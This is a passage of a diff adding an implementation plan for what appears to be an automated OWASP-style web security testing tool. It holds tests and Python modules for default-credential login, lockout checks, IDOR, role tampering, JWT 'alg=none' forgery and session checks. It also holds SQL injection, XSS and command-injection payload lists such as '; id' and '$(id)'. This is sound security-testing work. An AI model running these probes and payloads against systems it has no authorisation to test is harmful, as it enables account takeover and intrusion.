+                        "avg_valid_user_time": avg_valid,
+                        "avg_invalid_user_time": avg_invalid,
+                        "severity": "medium",
+                    })
+            except Exception:
+                pass
+
+    async def _discover_auth_endpoints(self) -> list[str]:
+        live_hosts = self.state.get("live_hosts") or []
+        endpoints = self.state.get("endpoints") or []
+        auth_paths = ["/login", "/signin", "/auth", "/api/login", "/api/auth",
+                      "/account/login", "/user/login", "/admin/login"]
+        found = []
+        for host in live_hosts:
+            base = host.rstrip("/")
+            for path in auth_paths:
+                try:
+                    resp = self._http_get(f"{base}{path}")
+                    if resp.status_code in [200, 302, 401, 405]:
+                        found.append(f"{base}{path}")
+                except Exception:
+                    continue
+        if found:
+            self.state.enrich("auth_endpoints", found)
+        return found
+
+    def _detect_enum_by_diff(self, resp_valid_user, resp_invalid_user) -> dict:
+        # Response content diff
+        diff = diff_responses(resp_valid_user.text, resp_invalid_user.text)
+        if not diff["identical"] and diff["similarity"] < 0.95:
+            return {"enumerable": True, "method": "response_content"}
+
+        # Status code diff
+        if resp_valid_user.status_code != resp_invalid_user.status_code:
+            return {"enumerable": True, "method": "status_code"}
+
+        # Response length diff
+        if abs(diff["length_diff"]) > 10:
+            return {"enumerable": True, "method": "response_length"}
+
+        return {"enumerable": False, "method": None}
+
+    async def _default_credentials(self):
+        self.logger.info("Starting default credential testing")
+        auth_endpoints = self.state.get("auth_endpoints") or []
+
+        for endpoint in auth_endpoints:
+            for username, password in self.DEFAULT_CREDENTIALS:
+                try:
+                    resp = self._post_login(endpoint, username, password)
+                    if self._is_login_success(resp):
+                        self.logger.critical(
+                            f"DEFAULT CREDENTIALS FOUND: {username}:{password} at {endpoint}"
+                        )
+                        self.evidence.log_confirmed_exploit("auth_testing", {
+                            "type": "default_credentials",
+                            "url": endpoint,
+                            "username": username,
+                            "password": password,
+                            "severity": "critical",
+                            "description": f"Default credentials {username}:{password} accepted",
+                        })
+                        self.state.enrich("confirmed_vulnerabilities", [{
+                            "type": "default_credentials",
+                            "url": endpoint,
+                            "severity": "critical",
+                            "description": f"Default credentials {username}:{password} accepted",
+                            "reproduction_steps": f"1. Navigate to {endpoint}\n2. Enter username: {username}\n3. Enter password: {password}\n4. Submit login form",
+                            "impact": "Full account access with default credentials",
+                            "mitigation": "Force password change on first login. Remove default accounts.",
+                        }])
+                        self.state.enrich("valid_usernames", [username])
+                        return  # Stop after first success
+                except Exception:
+                    continue
+
+    async def _lockout_testing(self):
+        self.logger.info("Starting lockout testing")
+        auth_endpoints = self.state.get("auth_endpoints") or []
+
+        for endpoint in auth_endpoints:
+            lockout_detected = False
+            captcha_detected = False
+            attempts_before_lockout = 0
+
+            for i in range(20):  # Test up to 20 attempts
+                try:
+                    resp = self._post_login(endpoint, "admin", f"wrong_password_{i}")
+                    body_lower = resp.text.lower()
+
+                    if "locked" in body_lower or "too many" in body_lower or resp.status_code == 429:
+                        lockout_detected = True
+                        attempts_before_lockout = i + 1
+                        break
+                    if "captcha" in body_lower or "recaptcha" in body_lower:
+                        captcha_detected = True
+                        attempts_before_lockout = i + 1
+                        break
+                except Exception:
+                    break
+
+            finding = {
+                "url": endpoint,
+                "lockout_detected": lockout_detected,
+                "captcha_detected": captcha_detected,
+                "attempts_before_trigger": attempts_before_lockout,
+            }
+
+            if not lockout_detected and not captcha_detected:
+                finding["severity"] = "medium"
+                finding["type"] = "weak_lockout"
+                finding["description"] = "No account lockout or rate limiting detected after 20 failed attempts"
+                self.state.enrich("potential_vulnerabilities", [finding])
+                self.evidence.log_potential_exploit("auth_testing", finding)
+            else:
+                self.evidence.log_parsed("auth_testing", "lockout_results", finding)
+
+    def _post_login(self, url: str, username: str, password: str):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.post(url, data={"username": username, "password": password})
+
+    def _http_get(self, url: str):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.get(url)
+
+    def _is_login_success(self, resp) -> bool:
+        if resp.status_code in [302, 303] and "location" in {k.lower() for k in resp.headers}:
+            location = resp.headers.get("Location", resp.headers.get("location", ""))
+            if "dashboard" in location or "home" in location or "welcome" in location:
+                return True
+        if resp.status_code == 200:
+            body_lower = resp.text.lower()
+            success_indicators = ["welcome", "dashboard", "logout", "my account", "profile"]
+            failure_indicators = ["invalid", "incorrect", "failed", "error", "wrong"]
+            if any(s in body_lower for s in success_indicators) and \
+               not any(f in body_lower for f in failure_indicators):
+                return True
+        return False
+```
+
+**Step 4: Run tests**
+
+```bash
+pytest tests/test_auth_testing.py -v
+```
+
+Expected: All PASS
+
+**Step 5: Commit**
+
+```bash
+git add wstg_orchestrator/modules/auth_testing.py tests/test_auth_testing.py
+git commit -m "feat: implement AuthTestingModule with username enum, default creds, and lockout detection"
+```
+
+---
+
+## Task 17: Authorization Testing Module
+
+**Files:**
+- Create: `wstg_orchestrator/modules/authorization_testing.py`
+- Create: `tests/test_authorization_testing.py`
+
+**Step 1: Write failing tests**
+
+```python
+# tests/test_authorization_testing.py
+import pytest
+from unittest.mock import MagicMock
+from wstg_orchestrator.modules.authorization_testing import AuthorizationTestingModule
+
+
+@pytest.fixture
+def authz_module():
+    state = MagicMock()
+    state.get.side_effect = lambda key: {
+        "live_hosts": ["https://app.example.com"],
+        "potential_idor_candidates": [
+            {"url": "https://app.example.com/user/123", "type": "numeric", "value": "123"},
+        ],
+        "endpoints": ["https://app.example.com/api/profile"],
+        "parameters": [],
+    }.get(key, [])
+    state.is_phase_complete.return_value = False
+    state.is_subcategory_complete.return_value = False
+    config = MagicMock()
+    config.base_domain = "example.com"
+    config.get_tool_config.return_value = {}
+    config.custom_headers = {}
+    config.get_auth_profile.return_value = None
+    scope = MagicMock()
+    scope.is_in_scope.return_value = True
+    limiter = MagicMock()
+    evidence = MagicMock()
+    evidence.log_parsed.return_value = "/tmp/test"
+    evidence.log_potential_exploit.return_value = "/tmp/test"
+    evidence.log_confirmed_exploit.return_value = "/tmp/test"
+    callback = MagicMock()
+    return AuthorizationTestingModule(state, config, scope, limiter, evidence, callback)
+
+
+def test_phase_name(authz_module):
+    assert authz_module.PHASE_NAME == "authorization_testing"
+
+
+def test_subcategories(authz_module):
+    assert "idor_testing" in authz_module.SUBCATEGORIES
+    assert "privilege_escalation" in authz_module.SUBCATEGORIES
+    assert "jwt_testing" in authz_module.SUBCATEGORIES
+
+
+def test_generate_idor_candidates(authz_module):
+    candidates = authz_module._generate_numeric_idor_values("123")
+    assert 122 in candidates
+    assert 124 in candidates
+    assert 1 in candidates
+
+
+def test_decode_jwt(authz_module):
+    # HS256 JWT with {"sub":"1234567890","name":"Test","iat":1516239022}
+    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+    result = authz_module._decode_jwt(token)
+    assert result is not None
+    assert result["header"]["alg"] == "HS256"
+    assert result["payload"]["name"] == "Test"
+```
+
+**Step 2: Run tests to verify they fail**
+
+```bash
+pytest tests/test_authorization_testing.py -v
+```
+
+**Step 3: Implement AuthorizationTestingModule**
+
+```python
+# wstg_orchestrator/modules/authorization_testing.py
+import base64
+import json
+import re
+
+from wstg_orchestrator.modules.base_module import BaseModule
+from wstg_orchestrator.utils.parser_utils import diff_responses
+
+
+class AuthorizationTestingModule(BaseModule):
+    PHASE_NAME = "authorization_testing"
+    SUBCATEGORIES = ["idor_testing", "privilege_escalation", "jwt_testing"]
+    EVIDENCE_SUBDIRS = [
+        "tool_output", "raw_requests", "raw_responses", "parsed",
+        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
+    ]
+
+    async def execute(self):
+        if not self.should_skip_subcategory("idor_testing"):
+            await self._idor_testing()
+            self.mark_subcategory_complete("idor_testing")
+
+        if not self.should_skip_subcategory("privilege_escalation"):
+            await self._privilege_escalation()
+            self.mark_subcategory_complete("privilege_escalation")
+
+        if not self.should_skip_subcategory("jwt_testing"):
+            await self._jwt_testing()
+            self.mark_subcategory_complete("jwt_testing")
+
+    async def _idor_testing(self):
+        self.logger.info("Starting IDOR testing")
+        candidates = self.state.get("potential_idor_candidates") or []
+
+        for candidate in candidates:
+            if candidate["type"] == "numeric":
+                await self._test_numeric_idor(candidate)
+            elif candidate["type"] == "uuid":
+                self.logger.info(f"UUID IDOR candidate detected: {candidate['url']} (manual review recommended)")
+                self.evidence.log_parsed("authorization_testing", "uuid_idor_candidate", candidate)
+
+    async def _test_numeric_idor(self, candidate: dict):
+        url = candidate["url"]
+        original_id = candidate["value"]
+        test_ids = self._generate_numeric_idor_values(original_id)
+
+        try:
+            original_resp = self._http_get(url)
+        except Exception:
+            return
+
+        for test_id in test_ids:
+            test_url = url.replace(f"/{original_id}", f"/{test_id}")
+            try:
+                test_resp = self._http_get(test_url)
+                if test_resp.status_code == 200:
+                    diff = diff_responses(original_resp.text, test_resp.text)
+                    if not diff["identical"] and diff["similarity"] > 0.3:
+                        self.evidence.log_potential_exploit("authorization_testing", {
+                            "type": "idor",
+                            "original_url": url,
+                            "test_url": test_url,
+                            "original_id": original_id,
+                            "test_id": test_id,
+                            "severity": "high",
+                            "response_similarity": diff["similarity"],
+                        })
+                        self.state.enrich("potential_vulnerabilities", [{
+                            "type": "idor",
+                            "url": test_url,
+                            "severity": "high",
+                            "description": f"Potential IDOR: changing ID from {original_id} to {test_id} returned different data",
+                        }])
+            except Exception:
+                continue
+
+    def _generate_numeric_idor_values(self, original: str) -> list[int]:
+        val = int(original)
+        candidates = [val - 1, val + 1, val - 2, val + 2, 1, 0]
+        return [c for c in candidates if c >= 0 and c != val]
+
+    async def _privilege_escalation(self):
+        self.logger.info("Starting privilege escalation testing")
+        endpoints = self.state.get("endpoints") or []
+        params = self.state.get("parameters") or []
+
+        # Hidden field tampering - look for role/admin parameters
+        role_params = [p for p in params if p.get("name", "").lower() in
+                       ["role", "admin", "is_admin", "isadmin", "user_role",
+                        "privilege", "level", "access_level", "group"]]
+
+        for param in role_params:
+            url = param.get("url", "")
+            name = param.get("name", "")
+            for tamper_value in ["admin", "1", "true", "root", "superadmin"]:
+                try:
+                    resp = self._http_post(url, data={name: tamper_value})
+                    if resp.status_code == 200:
+                        body_lower = resp.text.lower()
+                        if any(ind in body_lower for ind in ["admin", "dashboard", "manage", "settings"]):
+                            self.evidence.log_potential_exploit("authorization_testing", {
+                                "type": "privilege_escalation",
+                                "url": url,
+                                "parameter": name,
+                                "tampered_value": tamper_value,
+                                "severity": "critical",
+                            })
+                            self.state.enrich("potential_vulnerabilities", [{
+                                "type": "privilege_escalation",
+                                "url": url,
+                                "severity": "critical",
+                                "description": f"Potential privilege escalation via {name}={tamper_value}",
+                            }])
+                except Exception:
+                    continue
+
+    async def _jwt_testing(self):
+        self.logger.info("Starting JWT testing")
+        # Look for JWTs in responses from auth endpoints
+        auth_endpoints = self.state.get("auth_endpoints") or []
+        live_hosts = self.state.get("live_hosts") or []
+
+        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
+
+        for url in auth_endpoints + live_hosts:
+            try:
+                resp = self._http_get(url)
+                # Check response body and headers for JWTs
+                all_text = resp.text + str(resp.headers)
+                tokens = jwt_pattern.findall(all_text)
+
+                for token in tokens:
+                    decoded = self._decode_jwt(token)
+                    if decoded:
+                        self.evidence.log_parsed("authorization_testing", "jwt_decoded", {
+                            "url": url, "header": decoded["header"],
+                            "payload": decoded["payload"],
+                        })
+
+                        # Test algorithm=none
+                        if decoded["header"].get("alg") != "none":
+                            none_token = self._craft_none_jwt(decoded["payload"])
+                            try:
+                                none_resp = self._http_get(url, extra_headers={
+                                    "Authorization": f"Bearer {none_token}"
+                                })
+                                if none_resp.status_code == 200:
+                                    self.evidence.log_confirmed_exploit("authorization_testing", {
+                                        "type": "jwt_alg_none",
+                                        "url": url,
+                                        "severity": "critical",
+                                        "description": "JWT accepts algorithm=none, signature validation bypassed",
+                                    })
+                                    self.state.enrich("confirmed_vulnerabilities", [{
+                                        "type": "jwt_alg_none",
+                                        "url": url,
+                                        "severity": "critical",
+                                        "description": "JWT accepts algorithm=none",
+                                        "reproduction_steps": "1. Decode JWT\n2. Set header alg to 'none'\n3. Remove signature\n4. Send modified token",
+                                        "impact": "Complete authentication bypass",
+                                        "mitigation": "Validate JWT algorithm server-side. Reject 'none' algorithm.",
+                                    }])
+                            except Exception:
+                                pass
+            except Exception:
+                continue
+
+    def _decode_jwt(self, token: str) -> dict | None:
+        try:
+            parts = token.split(".")
+            if len(parts) != 3:
+                return None
+
+            def decode_part(part: str) -> dict:
+                padding = 4 - len(part) % 4
+                part += "=" * padding
+                decoded = base64.urlsafe_b64decode(part)
+                return json.loads(decoded)
+
+            return {
+                "header": decode_part(parts[0]),
+                "payload": decode_part(parts[1]),
+                "signature": parts[2],
+            }
+        except Exception:
+            return None
+
+    def _craft_none_jwt(self, payload: dict) -> str:
+        header = base64.urlsafe_b64encode(
+            json.dumps({"alg": "none", "typ": "JWT"}).encode()
+        ).rstrip(b"=").decode()
+        payload_b64 = base64.urlsafe_b64encode(
+            json.dumps(payload).encode()
+        ).rstrip(b"=").decode()
+        return f"{header}.{payload_b64}."
+
+    def _http_get(self, url: str, extra_headers: dict | None = None):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.get(url, headers=extra_headers)
+
+    def _http_post(self, url: str, data: dict | None = None):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.post(url, data=data)
+```
+
+**Step 4: Run tests**
+
+```bash
+pytest tests/test_authorization_testing.py -v
+```
+
+Expected: All PASS
+
+**Step 5: Commit**
+
+```bash
+git add wstg_orchestrator/modules/authorization_testing.py tests/test_authorization_testing.py
+git commit -m "feat: implement AuthorizationTestingModule with IDOR, priv esc, and JWT testing"
+```
+
+---
+
+## Task 18: Session Testing Module
+
+**Files:**
+- Create: `wstg_orchestrator/modules/session_testing.py`
+- Create: `tests/test_session_testing.py`
+
+**Step 1: Write failing tests**
+
+```python
+# tests/test_session_testing.py
+import pytest
+from unittest.mock import MagicMock
+from wstg_orchestrator.modules.session_testing import SessionTestingModule
+
+
+@pytest.fixture
+def session_module():
+    state = MagicMock()
+    state.get.side_effect = lambda key: {
+        "live_hosts": ["https://app.example.com"],
+        "auth_endpoints": ["https://app.example.com/login"],
+    }.get(key, [])
+    state.is_phase_complete.return_value = False
+    state.is_subcategory_complete.return_value = False
+    config = MagicMock()
+    config.base_domain = "example.com"
+    config.get_tool_config.return_value = {}
+    config.custom_headers = {}
+    config.get_auth_profile.return_value = None
+    scope = MagicMock()
+    scope.is_in_scope.return_value = True
+    limiter = MagicMock()
+    evidence = MagicMock()
+    evidence.log_parsed.return_value = "/tmp/test"
+    evidence.log_potential_exploit.return_value = "/tmp/test"
+    callback = MagicMock()
+    return SessionTestingModule(state, config, scope, limiter, evidence, callback)
+
+
+def test_phase_name(session_module):
+    assert session_module.PHASE_NAME == "session_testing"
+
+
+def test_subcategories(session_module):
+    assert "cookie_flags" in session_module.SUBCATEGORIES
+    assert "session_fixation" in session_module.SUBCATEGORIES
+    assert "session_lifecycle" in session_module.SUBCATEGORIES
+
+
+def test_analyze_cookie_flags(session_module):
+    cookie_header = "session=abc123; Path=/; HttpOnly"
+    result = session_module._analyze_cookie_flags("session", cookie_header)
+    assert result["httponly"] is True
+    assert result["secure"] is False
+    assert result["samesite"] is None
+
+
+def test_analyze_cookie_flags_all_set(session_module):
+    cookie_header = "session=abc123; Path=/; HttpOnly; Secure; SameSite=Strict"
+    result = session_module._analyze_cookie_flags("session", cookie_header)
+    assert result["httponly"] is True
+    assert result["secure"] is True
+    assert result["samesite"] == "Strict"
+```
+
+**Step 2: Run tests to verify they fail**
+
+```bash
+pytest tests/test_session_testing.py -v
+```
+
+**Step 3: Implement SessionTestingModule**
+
+```python
+# wstg_orchestrator/modules/session_testing.py
+import re
+
+from wstg_orchestrator.modules.base_module import BaseModule
+
+
+class SessionTestingModule(BaseModule):
+    PHASE_NAME = "session_testing"
+    SUBCATEGORIES = ["cookie_flags", "session_fixation", "session_lifecycle"]
+    EVIDENCE_SUBDIRS = [
+        "tool_output", "raw_requests", "raw_responses", "parsed",
+        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
+    ]
+
+    async def execute(self):
+        if not self.should_skip_subcategory("cookie_flags"):
+            await self._cookie_flags()
+            self.mark_subcategory_complete("cookie_flags")
+
+        if not self.should_skip_subcategory("session_fixation"):
+            await self._session_fixation()
+            self.mark_subcategory_complete("session_fixation")
+
+        if not self.should_skip_subcategory("session_lifecycle"):
+            await self._session_lifecycle()
+            self.mark_subcategory_complete("session_lifecycle")
+
+    async def _cookie_flags(self):
+        self.logger.info("Starting cookie flag analysis")
+        live_hosts = self.state.get("live_hosts") or []
+
+        for host_url in live_hosts:
+            try:
+                resp = self._http_get(host_url)
+                set_cookies = []
+                for key, value in resp.headers.items():
+                    if key.lower() == "set-cookie":
+                        set_cookies.append(value)
+
+                # Also check if headers is a dict with combined cookies
+                if not set_cookies and "Set-Cookie" in resp.headers:
+                    set_cookies = [resp.headers["Set-Cookie"]]
+
+                for cookie_str in set_cookies:
+                    name_match = re.match(r'([^=]+)=', cookie_str)
+                    if not name_match:
+                        continue
+                    name = name_match.group(1).strip()
+                    analysis = self._analyze_cookie_flags(name, cookie_str)
+                    analysis["url"] = host_url
+
+                    issues = []
+                    if not analysis["httponly"]:
+                        issues.append("Missing HttpOnly flag")
+                    if not analysis["secure"] and host_url.startswith("https"):
+                        issues.append("Missing Secure flag")
+                    if analysis["samesite"] is None:
+                        issues.append("Missing SameSite attribute")
+
+                    if issues:
+                        finding = {
+                            "type": "insecure_cookie",
+                            "url": host_url,
+                            "cookie_name": name,
+                            "issues": issues,
+                            "severity": "low",
+                            "description": f"Cookie '{name}' missing flags: {', '.join(issues)}",
+                        }
+                        self.state.enrich("potential_vulnerabilities", [finding])
+                        self.evidence.log_potential_exploit("session_testing", finding)
+
+                    self.evidence.log_parsed("session_testing", f"cookie_{name}", analysis)
+            except Exception as e:
+                self.logger.debug(f"Cookie analysis failed for {host_url}: {e}")
+
+    def _analyze_cookie_flags(self, name: str, cookie_str: str) -> dict:
+        cookie_lower = cookie_str.lower()
+        samesite = None
+        samesite_match = re.search(r'samesite=(\w+)', cookie_lower)
+        if samesite_match:
+            samesite = samesite_match.group(1).capitalize()
+
+        return {
+            "name": name,
+            "httponly": "httponly" in cookie_lower,
+            "secure": "secure" in cookie_lower.split(";")
+                      or any("secure" == part.strip() for part in cookie_lower.split(";")),
+            "samesite": samesite,
+            "path": self._extract_attr(cookie_str, "path"),
+            "domain": self._extract_attr(cookie_str, "domain"),
+        }
+
+    def _extract_attr(self, cookie_str: str, attr: str) -> str | None:
+        match = re.search(rf'{attr}=([^;]+)', cookie_str, re.I)
+        return match.group(1).strip() if match else None
+
+    async def _session_fixation(self):
+        self.logger.info("Starting session fixation testing")
+        auth_endpoints = self.state.get("auth_endpoints") or []
+
+        for endpoint in auth_endpoints:
+            try:
+                # Get a session cookie before login
+                pre_resp = self._http_get(endpoint)
+                pre_cookies = self._extract_session_cookies(pre_resp)
+
+                if not pre_cookies:
+                    continue
+
+                # Attempt login (with test credentials)
+                post_resp = self._http_post(endpoint, data={
+                    "username": "test_fixation_check", "password": "test_fixation_check"
+                })
+                post_cookies = self._extract_session_cookies(post_resp)
+
+                # Check if session ID changed after login attempt
+                for cookie_name in pre_cookies:
+                    if cookie_name in post_cookies:
+                        if pre_cookies[cookie_name] == post_cookies[cookie_name]:
+                            self.evidence.log_potential_exploit("session_testing", {
+                                "type": "session_fixation",
+                                "url": endpoint,
+                                "cookie_name": cookie_name,
+                                "severity": "high",
+                                "description": "Session ID not rotated after login attempt",
+                            })
+                            self.state.enrich("potential_vulnerabilities", [{
+                                "type": "session_fixation",
+                                "url": endpoint,
+                                "severity": "high",
+                                "description": f"Session cookie '{cookie_name}' not rotated on login",
+                            }])
+            except Exception as e:
+                self.logger.debug(f"Session fixation test failed for {endpoint}: {e}")
+
+    async def _session_lifecycle(self):
+        self.logger.info("Starting session lifecycle testing")
+        # This requires authenticated session - check for auth profile
+        auth_profile = self.config.get_auth_profile("default") if hasattr(self.config, 'get_auth_profile') else None
+
+        if not auth_profile:
+            self.logger.info("No auth profile configured, skipping session lifecycle tests")
+            return
+
+        # TODO: Test session invalidation on logout
+        # TODO: Test session reuse after logout
+        # TODO: Test session timeout
+        self.logger.info("Session lifecycle tests require authenticated session (TODO: implement with auth profile)")
+
+    def _extract_session_cookies(self, resp) -> dict:
+        cookies = {}
+        session_names = ["session", "sessionid", "phpsessid", "jsessionid",
+                         "sid", "sess", "token", "auth", "connect.sid"]
+        headers = resp.headers if hasattr(resp, 'headers') else {}
+        for key, value in headers.items():
+            if key.lower() == "set-cookie":
+                name_match = re.match(r'([^=]+)=([^;]+)', value)
+                if name_match:
+                    name = name_match.group(1).strip().lower()
+                    val = name_match.group(2).strip()
+                    if any(sn in name for sn in session_names):
+                        cookies[name_match.group(1).strip()] = val
+        return cookies
+
+    def _http_get(self, url: str):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.get(url)
+
+    def _http_post(self, url: str, data: dict | None = None):
+        from wstg_orchestrator.utils.http_utils import HttpClient
+        client = HttpClient(
+            scope_checker=self.scope,
+            rate_limiter=self.rate_limiter,
+            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
+        )
+        return client.post(url, data=data)
+```
+
+**Step 4: Run tests**
+
+```bash
+pytest tests/test_session_testing.py -v
+```
+
+Expected: All PASS
+
+**Step 5: Commit**
+
+```bash
+git add wstg_orchestrator/modules/session_testing.py tests/test_session_testing.py
+git commit -m "feat: implement SessionTestingModule with cookie flags, fixation, and lifecycle tests"
+```
+
+---
+
+## Task 19: Input Validation Module
+
+**Files:**
+- Create: `wstg_orchestrator/modules/input_validation.py`
+- Create: `tests/test_input_validation.py`
+
+**Step 1: Write failing tests**
+
+```python
+# tests/test_input_validation.py
+import pytest
+from unittest.mock import MagicMock
+from wstg_orchestrator.modules.input_validation import InputValidationModule
+
+
+@pytest.fixture
+def iv_module():
+    state = MagicMock()
+    state.get.side_effect = lambda key: {
+        "parameters": [
+            {"url": "https://app.example.com/search", "name": "q", "value": "test", "method": "GET"},
+            {"url": "https://app.example.com/api/users", "name": "id", "value": "1", "method": "GET"},
+        ],
+        "live_hosts": ["https://app.example.com"],
+    }.get(key, [])
+    state.is_phase_complete.return_value = False
+    state.is_subcategory_complete.return_value = False
+    config = MagicMock()
+    config.base_domain = "example.com"
+    config.get_tool_config.return_value = {}
+    config.custom_headers = {}
+    scope = MagicMock()
+    scope.is_in_scope.return_value = True
+    scope.is_attack_vector_allowed.return_value = True
+    limiter = MagicMock()
+    evidence = MagicMock()
+    evidence.log_parsed.return_value = "/tmp/test"
+    evidence.log_potential_exploit.return_value = "/tmp/test"
+    evidence.log_confirmed_exploit.return_value = "/tmp/test"
+    callback = MagicMock()
+    callback.generate_callback.return_value = ("http://127.0.0.1:8443/abc123", "abc123")
+    return InputValidationModule(state, config, scope, limiter, evidence, callback)
+
+
+def test_phase_name(iv_module):
+    assert iv_module.PHASE_NAME == "input_validation"
+
+
+def test_subcategories(iv_module):
+    assert "sqli_testing" in iv_module.SUBCATEGORIES
+    assert "xss_testing" in iv_module.SUBCATEGORIES
+    assert "command_injection" in iv_module.SUBCATEGORIES
+
+
+def test_sqli_payloads_exist(iv_module):
+    assert len(iv_module.SQLI_ERROR_PAYLOADS) > 0
+    assert "'" in iv_module.SQLI_ERROR_PAYLOADS
+
+
+def test_xss_payloads_exist(iv_module):
+    assert len(iv_module.XSS_PAYLOADS) > 0
+    assert any("<script>" in p.lower() or "onerror" in p.lower() for p in iv_module.XSS_PAYLOADS)
+
+
+def test_cmdi_payloads_exist(iv_module):
+    assert len(iv_module.CMDI_PAYLOADS) > 0
+```
+
+**Step 2: Run tests to verify they fail**
+
+```bash
+pytest tests/test_input_validation.py -v
+```
+
+**Step 3: Implement InputValidationModule**
+
+```python
+# wstg_orchestrator/modules/input_validation.py
+import re
+import time
+from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
+
+from wstg_orchestrator.modules.base_module import BaseModule
+from wstg_orchestrator.utils.command_runner import CommandRunner
+
+
+class InputValidationModule(BaseModule):
+    PHASE_NAME = "input_validation"
+    SUBCATEGORIES = ["sqli_testing", "xss_testing", "command_injection"]
+    EVIDENCE_SUBDIRS = [
+        "tool_output", "raw_requests", "raw_responses", "parsed",
+        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
+    ]
+
+    SQLI_ERROR_PAYLOADS = [
+        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1' OR '1'='1'--",
+        "' UNION SELECT NULL--", "1; SELECT 1--", "' AND 1=1--",
+        "' AND 1=2--", "admin'--",
+    ]
+
+    SQLI_TIME_PAYLOADS = [
+        "' OR SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
+        "' OR pg_sleep(3)--", "1' AND SLEEP(3)--",
+    ]
+
+    SQLI_ERROR_SIGNATURES = [
+        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
+        r"valid MySQL result", r"pg_query\(\)", r"PostgreSQL.*ERROR",
+        r"ORA-\d{5}", r"Oracle.*Driver", r"Microsoft.*SQL.*Server",
+        r"ODBC SQL Server Driver", r"SQLite.*error", r"sqlite3\.OperationalError",
+        r"Unclosed quotation mark", r"quoted string not properly terminated",
+    ]
+
+    XSS_PAYLOADS = [
+        '<script>alert(1)</script>',
+        '"><script>alert(1)</script>',
+        "'-alert(1)-'",
+        '<img src=x onerror=alert(1)>',
+        '<svg onload=alert(1)>',
+        '"><img src=x onerror=alert(1)>',
+        "javascript:alert(1)",
+        '<body onload=alert(1)>',
+        # WAF bypass variants
+        '<ScRiPt>alert(1)</ScRiPt>',
+        '<img src=x oNeRrOr=alert(1)>',
+        '&#60;script&#62;alert(1)&#60;/script&#62;',
+        '<svg/onload=alert(1)>',
+    ]
+
+    CMDI_PAYLOADS = [
+        "; id", "| id", "|| id", "&& id", "`id`", "$(id)",
+        "; whoami", "| whoami", "& whoami",
+    ]
+
+    CMDI_TIME_PAYLOADS = [
+        "; sleep 3", "| sleep 3", "|| sleep 3", "&& sleep 3",
+        "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
+    ]
+
+    CMDI_SIGNATURES = [
+        r"uid=\d+\(", r"root:", r"www-data", r"nobody",
+    ]
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self._cmd = CommandRunner(
+            tool_configs={
+                name: self.config.get_tool_config(name)
+                for name in ["sqlmap", "commix"]
+            }
+        )
+
+    async def execute(self):
+        if not self.should_skip_subcategory("sqli_testing"):
+            await self._sqli_testing()
+            self.mark_subcategory_complete("sqli_testing")
+
+        if not self.should_skip_subcategory("xss_testing"):
+            await self._xss_testing()
+            self.mark_subcategory_complete("xss_testing")
+
+        if not self.should_skip_subcategory("command_injection"):
+            await self._command_injection()
+            self.mark_subcategory_complete("command_injection")
+
+    async def _sqli_testing(self):
+        self.logger.info("Starting SQL injection testing")
+        parameters = self.state.get("parameters") or []
+
+        for param in parameters:
+            url = param.get("url", "")
+            name = param.get("name", "")
+            method = param.get("method", "GET")
+
+            # Error-based probes
+            for payload in self.SQLI_ERROR_PAYLOADS:
+                try:
+                    resp = self._inject_param(url, name, payload, method)
+                    for sig in self.SQLI_ERROR_SIGNATURES:
+                        if re.search(sig, resp.text, re.I):
+                            self.evidence.log_potential_exploit("input_validation", {
+                                "type": "sqli_error_based",
+                                "url": url, "parameter": name,
+                                "payload": payload, "signature": sig,
+                                "severity": "critical",
+                            })
+                            self.state.enrich("potential_vulnerabilities", [{
+                                "type": "sqli",
+                                "url": url,
+                                "severity": "critical",
+                                "description": f"Error-based SQLi in param '{name}' with payload: {payload}",
+                            }])
+                            # Hand off to sqlmap for confirmation
+                            await self._run_sqlmap(url, name, method)
+                            break
+                except Exception:
+                    continue
+
+            # Time-based probes
+            for payload in self.SQLI_TIME_PAYLOADS:
+                try:
+                    start = time.monotonic()
+                    resp = self._inject_param(url, name, payload, method)
+                    elapsed = time.monotonic() - start
+                    if elapsed >= 2.5:
+                        self.evidence.log_potential_exploit("input_validation", {
+                            "type": "sqli_time_based",
+                            "url": url, "parameter": name,
+                            "payload": payload, "delay": elapsed,
+                            "severity": "critical",
+                        })
+                        self.state.enrich("potential_vulnerabilities", [{
+                            "type": "sqli_time_based",
+                            "url": url,
+                            "severity": "critical",
+                            "description": f"Time-based SQLi in param '{name}' (delay: {elapsed:.1f}s)",
+                        }])
+                        await self._run_sqlmap(url, name, method)
+                        break
+                except Exception:
+                    continue
+
